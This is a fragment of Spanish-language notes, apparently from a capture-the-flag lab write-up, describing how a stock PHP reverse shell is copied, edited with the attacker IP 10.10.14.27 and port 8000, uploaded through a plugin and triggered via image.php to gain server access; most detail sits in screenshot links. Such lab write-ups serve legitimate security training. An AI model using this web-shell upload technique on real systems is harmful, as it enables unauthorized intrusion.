...
```
![](Pasted%20image%2020260118014946.png)
...
```
![](Pasted%20image%2020260118025400.png)
...
![](Pasted%20image%2020260118134652.png)
![](Pasted%20image%2020260118134712.png)
### REVERSE SHELL
Utilizamos una shell por defecto y la modificamos 
```
cp /usr/share/webshells/php/php-reverse-shell.php shell2.php
```
![](Pasted%20image%2020260118133935.png)
```
nano shell2.php
```
![](Pasted%20image%2020260118134054.png)
$ip = '10.10.14.27';  // CHANGE THIS
$port = 8000;       // CHANGE THIS

Cargamos la shell en el plugin 
![](Pasted%20image%2020260118134959.png)
...
```
![](Pasted%20image%2020260118135035.png)

Al cargar el archivo image.php comprobamos que la shell funciona y conseguimos acceso al servidor
![](Pasted%20image%2020260118135247.png)
![](Pasted%20image%2020260118135339.png)
